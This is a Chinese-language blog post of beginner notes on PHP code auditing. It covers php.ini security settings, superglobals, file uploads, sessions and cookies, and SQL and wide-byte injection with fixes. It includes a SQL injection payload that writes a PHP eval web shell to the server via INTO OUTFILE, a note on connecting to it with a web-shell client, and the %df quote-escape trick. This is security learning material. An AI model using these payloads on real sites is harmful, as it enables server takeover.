<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="note,">










<meta name="description" content="代码审计基础入门笔记审计大致方向、思路注入 文件上传 跨站 程序异常处理 MVC架构： Model：数据逻辑部分 View：处理数据显示的部分，显示数据 Controller：应用程序中处理用户交互的部分 常见php框架 先看手册、架构，安全过滤机制， ThinkPHP Yaf Laravel Kohana Codelgniter Yii Smyfony doitphp 处理流程 获取请求、全局过">
<meta name="keywords" content="note">
<meta property="og:type" content="article">
<meta property="og:title" content="代码审计基入门笔记">
<meta property="og:url" content="http://yoursite.com/2019/07/18/代码审计基础入门笔记/index.html">
<meta property="og:site_name" content="V&#39;s blog">
<meta property="og:description" content="代码审计基础入门笔记审计大致方向、思路注入 文件上传 跨站 程序异常处理 MVC架构： Model：数据逻辑部分 View：处理数据显示的部分，显示数据 Controller：应用程序中处理用户交互的部分 常见php框架 先看手册、架构，安全过滤机制， ThinkPHP Yaf Laravel Kohana Codelgniter Yii Smyfony doitphp 处理流程 获取请求、全局过">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="http://yoursite.com/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563197438631.png">
<meta property="og:image" content="http://yoursite.com/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563251980990.png">
<meta property="og:image" content="http://yoursite.com/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563259300240.png">
<meta property="og:image" content="http://yoursite.com/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563260759584.png">
<meta property="og:image" content="http://yoursite.com/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563282310170.png">
<meta property="og:image" content="http://yoursite.com/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563283530673.png">
<meta property="og:image" content="http://yoursite.com/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563284488840.png">
<meta property="og:image" content="http://yoursite.com/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563284525211.png">
<meta property="og:image" content="http://yoursite.com/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563348454917.png">
<meta property="og:image" content="http://yoursite.com/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563354832317.png">
<meta property="og:image" content="http://yoursite.com/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563355377723.png">
<meta property="og:image" content="http://yoursite.com/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563356062805.png">
<meta property="og:image" content="http://yoursite.com/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563367306026.png">
<meta property="og:image" content="http://yoursite.com/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563369370804.png">
<meta property="og:image" content="http://yoursite.com/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563373599421.png">
<meta property="og:image" content="http://yoursite.com/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563416371109.png">
<meta property="og:image" content="http://yoursite.com/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563417336599.png">
<meta property="og:updated_time" content="2019-07-30T13:16:11.977Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="代码审计基入门笔记">
<meta name="twitter:description" content="代码审计基础入门笔记审计大致方向、思路注入 文件上传 跨站 程序异常处理 MVC架构： Model：数据逻辑部分 View：处理数据显示的部分，显示数据 Controller：应用程序中处理用户交互的部分 常见php框架 先看手册、架构，安全过滤机制， ThinkPHP Yaf Laravel Kohana Codelgniter Yii Smyfony doitphp 处理流程 获取请求、全局过">
<meta name="twitter:image" content="http://yoursite.com/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563197438631.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/2019/07/18/代码审计基础入门笔记/">





  <title>代码审计基入门笔记 | V's blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">V's blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">Daily life of a rookie</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/18/代码审计基础入门笔记/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="V">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="V's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">代码审计基入门笔记</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-18T14:46:35+08:00">
                2019-07-18
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h1 id="代码审计基础入门笔记"><a href="#代码审计基础入门笔记" class="headerlink" title="代码审计基础入门笔记"></a>代码审计基础入门笔记</h1><h3 id="审计大致方向、思路"><a href="#审计大致方向、思路" class="headerlink" title="审计大致方向、思路"></a>审计大致方向、思路</h3><p>注入</p>
<p>文件上传</p>
<p>跨站</p>
<p>程序异常处理</p>
<p>MVC架构：</p>
<p>Model：数据逻辑部分</p>
<p>View：处理数据显示的部分，显示数据</p>
<p>Controller：应用程序中处理用户交互的部分</p>
<p>常见php框架</p>
<p>先看手册、架构，安全过滤机制，</p>
<p>ThinkPHP</p>
<p>Yaf</p>
<p>Laravel</p>
<p>Kohana</p>
<p>Codelgniter</p>
<p>Yii</p>
<p>Smyfony</p>
<p>doitphp</p>
<p>处理流程</p>
<p>获取请求、<strong>全局过滤</strong>、模块文件、C函数内容、M函数内容、V显示</p>
<p>网站目录结构</p>
<p>主目录</p>
<p>模块目录</p>
<p>插件目录</p>
<p>上传目录</p>
<p>模块目录</p>
<p>数据目录</p>
<p>配置目录</p>
<p>配置文件</p>
<p>公共函数文件</p>
<p>安全过滤文件</p>
<p>数据库结构</p>
<p>入口文件</p>
<p>通读原文：函数集文件、配置文件（config.php）、安全过滤文件（lib.php）、index文件</p>
<p>敏感关键字回溯参数？</p>
<p>查找可控变量（高明的黑客）</p>
<p>功能点定向审计</p>
<p>程序安装、文件上传、文件管理、登录验证、备份恢复、找回密码</p>
<p>一切输入都是有害的</p>
<p>一切进入函数的变量都是有害的（危险函数）</p>
<h3 id="php-ini"><a href="#php-ini" class="headerlink" title="php.ini"></a>php.ini</h3><p>安全模式，safe_mode = off 【5.4.0后被移除】</p>
<p>禁用函数，disable_function = system</p>
<p>com组件,com.allow_dcom = false</p>
<p>全局变量注册开关 register_globals = Off    (使用$_GET[‘name’]来获取数据)</p>
<p>【为On时，POST或GET，都将自动使用全局变量的值来接受值】</p>
<p>魔术引号自动过滤： magic_quotes_gpc = on 开启时把单引号、双引号、反斜杠、和NULL加上反斜杠“\”进行转义，影响GET、POST、Cookies。开启以提高安全性，【5.4.0后被移除】</p>
<p>是否允许包含远程文件 allow_url_inlude = off</p>
<p>是否允许打开远程文件 allow_url_open = on</p>
<p>目录权限</p>
<p>HTTP头部版本信息泄露PHP版  expose_php = off</p>
<p>文件上传临时目录  upload_tmp_dir = （不设定则采用系统的临时目录）</p>
<p>用户可访问目录  open_basedir = E:\Local Test\WWW  (限制脚本的活动区域)</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(<span class="name">scandir</span>(<span class="name">dirname</span>(<span class="name">path</span>: __FILE__.<span class="string">"./../"</span>)))(上层目录)</span><br></pre></td></tr></table></figure>

<p>内部错误选项   display_errors = on (调试时开启，发布后关闭，避免爆出物理地址)</p>
<p>错误报告级别  error_reporting = E_ALL &amp; ~E_NOTICE    (最高级别)</p>
<h3 id="代码调试小技巧"><a href="#代码调试小技巧" class="headerlink" title="代码调试小技巧"></a>代码调试小技巧</h3><p>print_r($var)</p>
<p>var_dump($var)    详细、数据类型、长度</p>
<p>debug_zval_dump  比print_r多一个调用次数</p>
<p>debug_print_backtrace();显示函数调用栈的信息</p>
<p>exit();当断点用好了</p>
<p>Xdebug，调试php代码的工具</p>
<p>配置</p>
<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563197438631.png" alt="1563197438631"></p>
<h3 id="全局变量和超全局变量"><a href="#全局变量和超全局变量" class="headerlink" title="全局变量和超全局变量"></a>全局变量和超全局变量</h3><p>全局变量：全局变量在函数外定义，作用于不到函数内，函数内一用，global $a;</p>
<p>超全局变量：所有脚本有效，$_GET,$_POST,$_SERVER,$_COOKIE,其他的存在$GLOBALS数组中</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_REQUEST	$_ENV	$_SESSION	$_FILES</span><br></pre></td></tr></table></figure>

<p>globals $name;    参数传递的作用</p>
<p>$GLOBALS[‘name’] =  123    变量的作用域设置的全局</p>
<p>$_REQUEST = POST or GET</p>
<p>$_SERVER     保存关于报头、路径和脚本位置的信息。</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">$_SERVER[<span class="string">'HTTP_HOST'</span>]  请求头信息中的Host内容，获取当前域名。</span><br><span class="line">$_SERVER[<span class="string">"SERVER_NAME"</span>]  输出配置文件httpd.conf中的ServerName，一般情况下与HTTP_HOST值相同，但如果服务器端口不是默认的<span class="number">80</span>端口，或者协议规范不是HTTP/<span class="number">1.1</span>时，HTTP_HOST会包含这些信息，而SERVER_NAME不一定包含。（主要看配置文件的设置）。</span><br><span class="line">$_SERVER[<span class="string">"HTTP_USER_AGENT"</span>]  获取用户相关信息，包括用户浏览器、操作系统等信息。</span><br><span class="line">$_SERVER[<span class="string">'HTTP_ACCEPT'</span>]  当前请求的ACCEPT头部信息。</span><br><span class="line">$_SERVER[<span class="string">"HTTP_ACCEPT_LANGUAGE"</span>]  这个值是由浏览器发送，表明用户默认的语言设置，后面的q值表示用户对该语言的喜好程度。</span><br><span class="line">$_SERVER[<span class="string">"HTTP_ACCEPT_ENCODING"</span>]  大部分的现代浏览器都支持gzip压缩，并会把这一信息报告给服务器。这时服务器就会压缩过的HTML发送给浏览器。这可以减少近<span class="number">80</span>%的文件大小，以节省下载时间和带宽。</span><br><span class="line">$_SERVER[<span class="string">"HTTP_COOKIE"</span>]  浏览器的cookie信息。</span><br><span class="line">$_SERVER[<span class="string">"HTTP_CONNECTION"</span>]  当前请求的连接情况。</span><br><span class="line">$_SERVER[<span class="string">"HTTP_UPGRADE_INSECURE_REQUESTS"</span>]  表示浏览器可读懂服务器发过来的请求，</span><br><span class="line">$_SERVER[<span class="string">"HTTP_CACHE_CONTROL"</span>]  表示浏览器是否会缓存这个页面信息。</span><br><span class="line">$_SERVER[<span class="string">"PATH"</span>]  当前脚本所在文件系统。</span><br><span class="line">$_SERVER[<span class="string">"SystemRoot"</span>]  当前服务器的操作系统。</span><br><span class="line">$_SERVER[<span class="string">"COMSPEC"</span>]  指向cmd.exe的路径。</span><br><span class="line">$_SERVER[<span class="string">"PATHEXT"</span>]  环境变量设置。</span><br><span class="line">$_SERVER[<span class="string">"WINDIR"</span>]  脚本指向的系统目录。</span><br><span class="line">$_SERVER[<span class="string">"SERVER_SIGNATURE"</span>]  包含服务器版本和虚拟主机名的字符串。</span><br><span class="line">$_SERVER[<span class="string">"SERVER_SOFTWARE"</span>]  服务器软件配置信息。</span><br><span class="line">$_SERVER[<span class="string">"SERVER_ADDR"</span>]  当前运行脚本的服务器的ip地址。</span><br><span class="line">$_SERVER[<span class="string">"SERVER_PORT"</span>]  服务器端口。</span><br><span class="line">$_SERVER[<span class="string">"REMOTE_ADDR"</span>]  浏览网页的用户ip。<span class="comment">//可以赋值以修改、伪造</span></span><br><span class="line">$_SERVER[<span class="string">"DOCUMENT_ROOT"</span>]  当前运行脚本所在的根目录。</span><br><span class="line">$_SERVER[<span class="string">"REQUEST_SCHEME"</span>]  服务器通信协议，是http或https。</span><br><span class="line">$_SERVER[<span class="string">"CONTEXT_PREFIX"</span>]  前缀。</span><br><span class="line">$_SERVER[<span class="string">"CONTEXT_DOCUMENT_ROOT"</span>]  当前脚本所在的文档根目录。</span><br><span class="line">$_SERVER[<span class="string">"SERVER_ADMIN"</span>]  服务器管理员信息。</span><br><span class="line">$_SERVER[<span class="string">"SCRIPT_FILENAME"</span>]  当前执行脚本的绝对路径。</span><br><span class="line">$_SERVER [<span class="string">"REMOTE_PORT"</span>]  用户连接到服务器时所使用的端口。</span><br><span class="line">$_SERVER[<span class="string">"GATEWAY_INTERFACE"</span>]  服务器使用的CGI规范的版本。</span><br><span class="line">$_SERVER[<span class="string">"SERVER_PROTOCOL"</span>]  请求页面时通信协议的名称和版本。</span><br><span class="line">$_SERVER[<span class="string">"REQUEST_METHOD"</span>]  请求提交数据的方式。</span><br><span class="line">$_SERVER[<span class="string">"QUERY_STRING"</span>]  服务器请求时？后面的参数。</span><br><span class="line">$_SERVER[<span class="string">"REQUEST_URI"</span>]  当前脚本路径，根目录之后的目录。</span><br><span class="line">$_SERVER[<span class="string">"SCRIPT_NAME"</span>]  当前脚本的路径。这在页面需要指向自己时非常有用。</span><br><span class="line">$_SERVER[<span class="string">"PHP_SELF"</span>]  当前正在执行脚本的文件名。</span><br><span class="line">$_SERVER[<span class="string">"REQUEST_TIME"</span>]  得到请求开始时的时间戳。</span><br><span class="line"></span><br><span class="line">var_dump($_SERVER)；</span><br></pre></td></tr></table></figure>

<p>$_FILES    文件上传</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$_FILES数组内容如下: </span><br><span class="line">$_FILES[<span class="string">'myFile'</span>][<span class="symbol">'name'</span>] 客户端文件的原名称。 </span><br><span class="line">$_FILES[<span class="string">'myFile'</span>][<span class="symbol">'type'</span>] 文件的 MIME 类型，需要浏览器提供该信息的支持，例如"image/gif"。 </span><br><span class="line">$_FILES[<span class="string">'myFile'</span>][<span class="symbol">'size'</span>] 已上传文件的大小，单位为字节。 </span><br><span class="line">$<span class="emphasis">_FILES['myFile']['tmp_</span>name'] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload<span class="emphasis">_tmp_</span>dir 指定，但 用 putenv() 函数设置是不起作用的。 </span><br><span class="line">$_FILES[<span class="string">'myFile'</span>][<span class="symbol">'error'</span>] 和该文件上传相关的错误代码。['error'] 是在 PHP 4.2.0 版本中增加的。下面是它的说明：(它们在PHP3.0以后成了常量) </span><br><span class="line">UPLOAD<span class="emphasis">_ERR_</span>OK </span><br><span class="line">值：0; 没有错误发生，文件上传成功。 </span><br><span class="line">UPLOAD<span class="emphasis">_ERR_</span>INI_SIZE </span><br><span class="line">值：1; 上传的文件超过了 php.ini 中 upload<span class="emphasis">_max_</span>filesize 选项限制的值。 </span><br><span class="line">UPLOAD<span class="emphasis">_ERR_</span>FORM_SIZE </span><br><span class="line">值：2; 上传文件的大小超过了 HTML 表单中 MAX<span class="emphasis">_FILE_</span>SIZE 选项指定的值。 </span><br><span class="line">UPLOAD<span class="emphasis">_ERR_</span>PARTIAL </span><br><span class="line">值：3; 文件只有部分被上传。 </span><br><span class="line">UPLOAD<span class="emphasis">_ERR_</span>NO_FILE </span><br><span class="line">值：4; 没有文件被上传。 </span><br><span class="line">值：5; 上传文件大小为0. </span><br><span class="line"></span><br><span class="line">文件被上传结束后，默认地被存储在了临时目录中，这时您必须将它从临时目录中删除或移动到其它地方，如果没有，则会被删除。也就是不管是否上传成功，脚本执行完后临时目录里的文件肯定会被删除。所以在删除之前要用PHP的 copy() 函数将它复制到其它位置，此时，才算完成了上传文件过程。</span><br><span class="line">var<span class="emphasis">_dump($_</span>FILES)；</span><br></pre></td></tr></table></figure>

<p>表单：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span> =<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"upload.php"</span> <span class="attr">method</span> =<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> =<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">'file'</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"点击提交"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>$_SESSTION 当前脚本可用SESTION变量的数组</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sesstion_start();</span><br><span class="line">$test = <span class="number">123</span>;</span><br><span class="line">$_SESSTION[<span class="string">'value'</span>]=$test;</span><br><span class="line"><span class="keyword">echo</span> $_SESSTION[<span class="string">'value'</span>];</span><br><span class="line">sesstion_destory();</span><br></pre></td></tr></table></figure>

<p>$_COOKIE 通过HTTP Cookies 方式传递给当前脚本的变量的数组    </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$cookie = $_COOKIE[<span class="number">0</span>][<span class="string">'usename'</span>] = <span class="string">"name"</span>;</span><br><span class="line">var_dump ($_COOKIE);</span><br></pre></td></tr></table></figure>

<p>COOKIE or SESSTION</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">两个都可以用来存私密的东西，同样也都有有效期的说法。</span><br><span class="line">区别在于。</span><br><span class="line">session是放在服务器上的，过期与否取决于服务期的设定，cookie是存在客户端的，过去与否可以在cookie生成的时候设置进去。</span><br><span class="line"><span class="number">1</span>、cookie数据存放在客户的浏览器上，</span><br><span class="line">session数据放在服务器上</span><br><span class="line"><span class="number">2</span>、cookie不是很安全，别人可以分析存放在本地的COOKIE并进行COOKIE欺骗</span><br><span class="line">考虑到安全应当使用session</span><br><span class="line"><span class="number">3</span>、session会在一定时间内保存在服务器上。当访问增多，会比较占用你服务器的性能</span><br><span class="line">考虑到减轻服务器性能方面，应当使用COOKIE</span><br><span class="line"><span class="number">4</span>、单个cookie在客户端的限制是<span class="number">3</span>K，就是说一个站点在客户端存放的COOKIE不能<span class="number">3</span>K。</span><br><span class="line"><span class="number">5</span>、<span class="number">300</span>个的限制我没听说</span><br><span class="line"><span class="number">6</span>、所以个人建议：</span><br><span class="line">将登陆信息等重要信息存放为SESSION</span><br><span class="line">其他信息如果需要保留，可以放在COOKIE中</span><br></pre></td></tr></table></figure>

<p>$_ENV    包含服务器端环境变量的数组、可在PHP程序的任何地方直接访问，只是被动的接受服务器端的环境变量转换为数组元素</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">环境变量（environment <span class="keyword">variables</span>）一般是指在操作系统中用来指定操作系统运行环境的一些参数，如：临时文件夹位置和系统文件夹位置等</span><br></pre></td></tr></table></figure>

<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>mysql_query() 函数执行一条 MySQL 查询。</p>
<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563251980990.png" alt="1563251980990"></p>
<p>数字型注入    当输入的参数为整型，ID、年龄、页码，不需要单引号闭合</p>
<p>字符型注入    参数为字符串时，需要单引号闭合</p>
<p>查询数据</p>
<p>读写文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span> UNION SELECT <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>[$_POST[<span class="string">'a'</span>]];<span class="meta">?&gt;</span>(<span class="number">16</span>进制) into outfile E:/Local/WWW/<span class="number">3.</span>php<span class="string">'--+</span></span><br></pre></td></tr></table></figure>

<p>然后菜刀，127.0.0.1/3.php    a</p>
<p>执行命令</p>
<p>盲注</p>
<p>布尔盲注</p>
<p>时间盲注</p>
<p>报错盲注</p>
<p>HTTP头注入</p>
<p>修复方案：</p>
<p>使用预编译语句</p>
<p>使用存储过程</p>
<p>检查数据类型</p>
<p>使用安全函数</p>
<h3 id="宽字节注入、二次注入（扫描不出来）"><a href="#宽字节注入、二次注入（扫描不出来）" class="headerlink" title="宽字节注入、二次注入（扫描不出来）"></a>宽字节注入、二次注入（扫描不出来）</h3><p>addslashes()给‘加上\转义</p>
<p>逃逸单引号-&gt;加一个%df</p>
